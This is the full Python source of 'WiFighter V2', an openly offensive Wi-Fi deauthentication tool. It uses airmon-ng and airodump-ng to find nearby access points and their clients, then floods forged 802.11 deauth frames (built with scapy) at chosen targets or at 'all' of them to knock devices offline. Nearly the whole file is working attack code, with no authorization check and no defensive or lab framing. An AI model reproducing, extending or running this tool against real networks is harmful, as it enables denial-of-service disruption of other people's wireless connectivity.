#!/usr/bin/env python3
import argparse
import csv
import glob
import os
import re
import signal
import subprocess
import sys
import time
from threading import Event, Thread
from typing import Dict, List, Optional, Tuple

from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf

conf.verb = 0  # disable scapy verbose messages

SCAN_FILE_PREFIX = "wifighter_scan"

# Terminal colors
RED = "\033[91m"
YELLOW_BOLD = "\033[1;93m"
RESET = "\033[0m"

# Utilities


def banner() -> None:
    os.system("clear")
    print(f"""{RED}                                                                     
  ▄▄▄             ▄▄                                 ▄▄▄         ▄▄▄▄  
 █▀██  ██  ██▀▀  ██          █▄    █▄               █▀██  ██▀▀ ▄██████ 
   ██  ██  ██ ▀▀▄██▄▀▀    ▄▄ ██   ▄██▄      ▄         ██  ██   ▀█▄  ██ 
   ██  ██  ██ ██ ██ ██ ▄████ ████▄ ██ ▄█▀█▄ ████▄     ██  ██       ▄█▀ 
   ██▄ ██▄ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██▄█▀ ██        ██▄ ██     ▄█▀   
   ▀████▀███▀▄██▄██▄██▄▀████▄██ ██▄██▄▀█▄▄▄▄█▀         ▀███▀   ██████▄ 
                 ██       ██                                           
                ▀▀      ▀▀▀                                            

{YELLOW_BOLD}
            >>> WiFighter V2 — Deauth Tool by H8Laws  <<<
{RESET}""")


def ensure_root() -> None:
    """Check that the script is run as root."""
    if os.geteuid() != 0:
        print(f"{RED}[-] This tool must be run as root.{RESET}")
        sys.exit(1)


def clean_scan_files() -> None:
    """Delete old scan files matching the prefix."""
    for file in glob.glob(f"{SCAN_FILE_PREFIX}-*.csv"):
        try:
            os.remove(file)
        except Exception as e:
            print(f"[-] Error deleting {file}: {e}")


def find_latest_scan_csv() -> Optional[str]:
    """
    Return the path of the most recent CSV file created by airodump-ng
    matching the prefix SCAN_FILE_PREFIX-*.csv.
    """
    files = glob.glob(f"{SCAN_FILE_PREFIX}-*.csv")
    if not files:
        return None
    files.sort(key=os.path.getmtime, reverse=True)
    return files[0]


# Wi-Fi interfaces and monitor mode


def get_interfaces() -> List[str]:
    """
    Retrieve Wi-Fi interfaces via `iwconfig`.
    Returns a list of interface names (e.g., ['wlan0', 'wlan1']).
    """
    try:
        out = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
    except (subprocess.CalledProcessError, FileNotFoundError):
        # Fallback if iwconfig is not available -> try ip link
        try:
            out = subprocess.check_output(["ip", "-brief", "link"]).decode()
        except Exception:
            return []

    interfaces = []
    for line in out.splitlines():
        # Line starts like "wlan0     IEEE 802.11  ..."
        m = re.match(r"^([^\s:]+)\s+.*IEEE 802.11", line)
        if m:
            iface = m.group(1).strip()
            interfaces.append(iface)
        else:
            # Heuristic: sometimes iwconfig shows the interface on the next line
            parts = line.split()
            if parts and re.match(r"^wlan|^wl", parts[0]):
                interfaces.append(parts[0])
    # unique
    return list(dict.fromkeys(interfaces))


def enable_monitor_mode(interface: str) -> str:
    """
    Put the interface into monitor mode using airmon-ng.
    IMPORTANT: only `airmon-ng start` is executed.
    No automatic `airmon-ng stop` or shutdown attempts are performed here.
    Returns the monitor interface name (e.g., wlan0mon) if detected,
    otherwise returns the original interface.
    """
    print(f"[+] Enabling monitor mode on {interface} (only running 'airmon-ng start')...")
    subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Search for the monitor interface via iwconfig (Mode:Monitor) or suffix 'mon'
    try:
        out = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
    except Exception:
        return interface

    mon_iface = None
    for line in out.splitlines():
        if "Mode:Monitor" in line:
            mon_iface = line.split()[0]
            break

    if not mon_iface:
        # fallback: look for an interface with suffix 'mon'
        for line in out.splitlines():
            m = re.match(r"^([^\s:]+) ", line)
            if m and m.group(1).endswith("mon"):
                mon_iface = m.group(1)
                break

    if mon_iface:
        print(f"[+] Monitor interface detected: {mon_iface}")
        return mon_iface
    else:
        print("[-] Unable to detect monitor interface; using provided interface.")
        return interface


def disable_monitor_mode(mon_iface: str) -> None:
    """
    Does NOT automatically disable monitor mode (per user preference).
    We only display an informational reminder.
    If the user wants to stop monitor mode, they should do it manually:
      sudo airmon-ng stop <interface>
    """
    print(f"[!] monitor mode not stopped automatically for {mon_iface} (per user preference).")


# Airodump-ng scanning


def run_airodump(interface: str) -> subprocess.Popen:
    """
    Launch airodump-ng writing CSV files with prefix SCAN_FILE_PREFIX.
    Returns the Popen object.
    """
    clean_scan_files()
    print("[+] Scanning... (Ctrl+C to stop)")
    # airodump-ng will create SCAN_FILE_PREFIX-01.csv, -02.csv ... we'll take the latest
    proc = subprocess.Popen(
        ["airodump-ng", "-w", SCAN_FILE_PREFIX, "--output-format", "csv", interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return proc


def stop_airodump(proc: subprocess.Popen, timeout: float = 5.0) -> None:
    """Stop airodump-ng cleanly."""
    if proc.poll() is None:
        try:
            proc.send_signal(signal.SIGINT)
            try:
                proc.wait(timeout=timeout)
            except subprocess.TimeoutExpired:
                proc.terminate()
                proc.wait(timeout=timeout)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass


# Parsing airodump-ng CSV results


def parse_scan_results(filename: str) -> Tuple[List[Dict[str, str]], Dict[str, List[str]]]:
    """
    Parse the CSV generated by airodump-ng and return:
    - aps: list of dicts {bssid, channel, essid, power}
    - clients: dict mapping ap_bssid -> [client_mac, ...]
    Parsing is robust to variations in column indices (we use headers).
    """
    aps: List[Dict[str, str]] = []
    clients: Dict[str, List[str]] = {}

    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
        reader = csv.reader(f)
        section = "aps"  # 'aps' until we encounter 'Station MAC'
        headers_map = {}
        for row in reader:
            if not any(cell.strip() for cell in row):
                # empty row -> continue
                continue
            first = row[0].strip()
            # detect start of sections via headers
            if first.startswith("BSSID"):
                # header for the AP section
                section = "aps"
                headers_map = {h.strip(): i for i, h in enumerate(row)}
                continue
            if first.startswith("Station MAC"):
                # header for the clients section
                section = "clients"
                headers_map = {h.strip(): i for i, h in enumerate(row)}
                continue

            if section == "aps":
                # expect at least columns BSSID, CH, ESSID, Power (or PWR)
                try:
                    bssid = row[headers_map.get("BSSID", 0)].strip()
                    channel = row[headers_map.get("CH", 3)].strip() if "CH" in headers_map else row[3].strip()
                    # ESSID column sometimes "ESSID" or at the end
                    essid = ""
                    if "ESSID" in headers_map:
                        essid = row[headers_map["ESSID"]].strip()
                    else:
                        # fallback: take the last column which is often used
                        essid = row[-1].strip()
                    power = ""
                    if "PWR" in headers_map:
                        power = row[headers_map["PWR"]].strip()
                    elif "Power" in headers_map:
                        power = row[headers_map["Power"]].strip()
                    # ignore empty ESSID or BSSID lines
                    if essid == "" or bssid == "":
                        continue
                    aps.append({"bssid": bssid, "channel": channel, "essid": essid, "power": power})
                    clients[bssid] = []
                except Exception:
                    # ignore malformed lines
                    continue
            elif section == "clients":
                # columns: Station MAC, First time, Last time, Power, Packets, BSSID, Probed ESSIDs
                try:
                    client_mac = row[headers_map.get("Station MAC", 0)].strip()
                    ap_mac = (
                        row[headers_map.get("BSSID", -1)].strip()
                        if "BSSID" in headers_map
                        else (row[5].strip() if len(row) > 5 else "")
                    )
                    if ap_mac and ap_mac in clients:
                        clients[ap_mac].append(client_mac)
                except Exception:
                    continue

    return aps, clients


# Display utilities


def print_ap_list(aps: List[Dict[str, str]]) -> None:
    print("\n   NUM     ESSID                CH   PWR     BSSID")
    print("  ----  -------------------  ----  ----  -------------------")
    for i, ap in enumerate(aps):
        essid = ap.get("essid", "")[:20]
        ch = ap.get("channel", "")
        pwr = ap.get("power", "")
        bssid = ap.get("bssid", "")
        print(f"   {i+1:<2}   {essid:<20}  {ch:<4}  {pwr:<4}  {bssid}")


# Deauth attack


def set_channel(interface: str, channel: int) -> None:
    subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def deauth_attack(
    ap_mac: str,
    channel: int,
    interface: str,
    duration: int = 90,
    clients: Optional[List[str]] = None,
    stop_event: Optional[Event] = None,
) -> None:
    """
    Launch a DEAUTH attack on an AP and its clients (if provided).
    stop_event allows the attack to be interrupted from outside.
    """
    print(f"[+] Launching DEAUTH attack on {ap_mac} (CH {channel}) for {duration}s...")
    try:
        set_channel(interface, int(channel))
    except Exception:
        # ignore if conversion fails
        pass

    packets = []
    pkt_broadcast = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    packets.append(pkt_broadcast)

    if clients:
        for client_mac in clients:
            pkt_to_client = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
            pkt_to_ap = RadioTap() / Dot11(addr1=ap_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth(reason=7)
            packets.extend([pkt_to_client, pkt_to_ap])

    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            if stop_event and stop_event.is_set():
                break
            for pkt in packets:
                sendp(pkt, iface=interface, verbose=0)
            # small pause to avoid maxing out CPU
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass

    print("[+] End of the attack.")


# Main interactive flow


def interactive_main(mon_iface: str) -> None:
    # Start airodump
    proc = run_airodump(mon_iface)
    try:
        # wait for capture with keyboard interrupt support
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Stopping scan...")
        stop_airodump(proc)
        time.sleep(1)

    csv_file = find_latest_scan_csv()
    if not csv_file:
        print("[-] No scan files found.")
        disable_monitor_mode(mon_iface)
        return

    print(f"[+] Using scan file: {csv_file}")
    aps, all_clients = parse_scan_results(csv_file)
    if not aps:
        print("[-] No access point detected.")
        disable_monitor_mode(mon_iface)
        return

    print_ap_list(aps)
    selection = input("\n[+] Select a target (ex: 1 or 1,3 or all): ").strip()
    targets = []
    if selection.lower() == "all":
        targets = aps
    else:
        parts = selection.split(",")
        for part in parts:
            if part.isdigit():
                idx = int(part) - 1
                if 0 <= idx < len(aps):
                    targets.append(aps[idx])

    # optional duration
    try:
        dur = int(input("[?] Duration per target in seconds (default 60): ").strip() or "60")
    except Exception:
        dur = 60

    # Event to allow graceful stopping of attacks
    stop_event = Event()

    # Ctrl+C handler to stop attacks cleanly
    def _signal_handler(sig, frame):
        print("\n[+] Stopping attacks...")
        stop_event.set()

    old_handler = signal.signal(signal.SIGINT, _signal_handler)

    for ap in targets:
        clients = all_clients.get(ap["bssid"], [])
        # run attack in a thread so it can be stopped
        t = Thread(target=deauth_attack, args=(ap["bssid"], ap["channel"], mon_iface, dur, clients, stop_event))
        t.start()
        t.join()
        if stop_event.is_set():
            break

    # restore handler
    signal.signal(signal.SIGINT, old_handler)
    disable_monitor_mode(mon_iface)


def main() -> None:
    ensure_root()
    parser = argparse.ArgumentParser(description="WiFighter — DEAUTH tool (refactor)")
    parser.add_argument("--auto", action="store_true", help="Non-interactive mode (not fully implemented)")
    args = parser.parse_args()

    while True:
        banner()
        interfaces = get_interfaces()
        if not interfaces:
            print("[-] No Wi-Fi interface detected.")
            return

        print("[+] Available interfaces:")
        for i, iface in enumerate(interfaces):
            print(f"  {i}. {iface}")

        try:
            choice = input("[?] Choose the interface index (or q to quit): ").strip()
            if choice.lower() in ("q", "quit", "exit"):
                return
            idx = int(choice)
            if not (0 <= idx < len(interfaces)):
                print("[-] Invalid choice.")
                time.sleep(1)
                continue
            iface = interfaces[idx]
        except Exception:
            print("[-] Invalid input.")
            time.sleep(1)
            continue

        # Enable monitor mode (only run 'airmon-ng start')
        mon_iface = enable_monitor_mode(iface)

        # main interactive mode
        interactive_main(mon_iface)

        again = input("\n[?] Restart a scan ? (y/n) : ").strip().lower()
        if again != "y":
            break


if __name__ == "__main__":
    main()